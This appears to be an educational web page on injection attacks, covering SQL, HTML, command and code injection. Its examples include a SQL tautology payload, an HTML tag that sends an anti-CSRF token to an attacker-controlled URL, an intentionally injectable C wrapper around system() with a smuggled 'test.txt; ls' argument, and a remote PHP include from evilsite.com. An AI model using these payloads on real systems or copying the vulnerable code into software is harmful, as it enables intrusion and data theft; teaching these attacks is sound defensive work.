---
layout: applicationbased
title: Injection
---

<div id="main" class="s-content__main large-8 column">

    <article class="entry">

        <header class="entry__header">

            <h2 class="entry__title h1">
                Injection
            </h2>         
        </header>
        
        <div class="entry__content">
            <p><b>Injection attacks</b> occur when an attacker is able to send commands through a web server to a backend system, bypassing normal security controls and fooling the backend system into believing that the request came from the web server</p>
            <h4>SQL</h4>
            <p>SQL injections are the most common web hacking techniques. A SQL injection consists of injecting a malicious SQL statement in a web form to the SQL interpreter of the application.</p>
            <h5>Example</h5>
            <p><code>-- Smith' OR '1' = '1'</code> results in <code>SELECT * FROM users WHERE name = 'Smith' OR TRUE;</code>, because the statement will always be true it will return all the entries from the users table.</p> 
            <h4>HTML</h4>
            <p>HTML Injection is very similar to XSS. The injection attack is performed the same way, except the injected content is pure html tags, whereas XSS is a script.</p>
            <p>HTML injection can result in changing the webpage and harming the reputation of the page, exfiltrating sensitive user data, exfiltrating anti-CSRF tokens, and exfiltrating passwords stored in the browser.</p>
            <h5>Examples</h5>
            <p>To exfiltrate an anti-CSRF token, the attacker may, for example, use a non-terminated <code>&lt;img&gt;</code> tag like <code>&lt;img src=&apos;http://example.com/record.php? </code> – the lack of closing single quote causes the rest of the content to become part of the URL until another single quote is found. If valid code uses double quotes instead, the hidden input will be sent to attacker-controlled record.php script and recorded:</p>
            <code>&lt;img src=&apos;http://example.com/record.php?&lt;input type=&quot;hidden&quot; name=&quot;anti_xsrf&quot; value=&quot;s74bogj63h&quot;&gt;</code>
            <h4>Command</h4>
            <p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p>
            <h5>Examples</h5>
            <p>The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard output. It is also injectable:</p>
            <pre><code>
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char **argv) {
  char cat[] = "cat ";
  char *command;
  size_t commandLength;

  commandLength = strlen(cat) + strlen(argv[1]) + 1;
  command = (char *) malloc(commandLength);
  strncpy(command, cat, commandLength);
  strncat(command, argv[1], (commandLength - strlen(cat)) );

  system(command);
  return (0);
}
            </code></pre>
            <p>Used normally, the output is simply the contents of the file requested:</p>
            <pre><code>$ ./catWrapper test.txt
test</code></pre>
            <p>However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:</p>
            <pre><code>$ ./catWrapper "test.txt; ls"
test
test.txt
format.c 
catWrapper*
a.out*</code></pre>
            <p>If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.</p>
            <h4>Code</h4>
            <p>Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation, for example:</p>
            <ul>
                <li>allowed characters (standard regular expressions classes or custom)</li>
                <li>data format</li>
                <li>amount of expected data</li>
            </ul>
            <h5>Examples</h5>
            <p>If an application passes a parameter sent via a GET request to the PHP include() function with no input validation, the attacker may try to execute code other than what the developer had in mind.</p>
            <p>The URL below passes a page name to the include() function.</p>
            <p></p><blockquote>http://testsite.com/index.php?page=contact.php</blockquote></p>
            <p>The file “evilcode.php” may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment in which the web service runs. An attacker can ask the application to execute their PHP code using the following request:</p>
            <p><blockquote>http://testsite.com/?page=http://evilsite.com/evilcode.php</blockquote></p>
        </div> 

    </article> <!-- end entry -->

   

</div> <!-- end main -->